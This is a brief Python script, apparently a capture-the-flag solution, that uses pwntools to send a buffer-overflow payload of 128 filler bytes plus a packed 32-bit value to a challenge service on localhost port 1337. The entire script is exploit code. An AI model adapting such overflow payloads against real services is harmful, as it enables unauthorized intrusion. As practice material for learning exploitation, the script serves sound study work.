#!/usr/bin/python


from pwn import *


p=b'a'*128

#conn = process("../challenge/challenge")
conn=remote("127.0.0.1",1337)

conn.sendline(p+struct.pack('I', 0x29FE16))
print(conn.recvall())
